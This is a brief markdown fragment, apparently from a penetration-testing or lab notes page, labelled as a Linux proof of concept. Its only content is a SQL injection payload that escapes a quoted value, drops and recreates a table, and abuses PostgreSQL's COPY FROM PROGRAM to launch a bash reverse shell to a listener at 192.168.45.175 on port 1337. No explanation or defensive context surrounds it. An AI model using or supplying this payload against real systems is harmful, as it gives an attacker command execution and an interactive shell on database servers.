

## PoC

##### Linux

```
1';DROP TABLE IF EXISTS cmd_out;CREATE TABLE cmd_out(d text);COPY cmd_out FROM PROGRAM '/bin/bash -c "bash -i > /dev/tcp/192.168.45.175/1337 0<&1 2>&1"'--
```
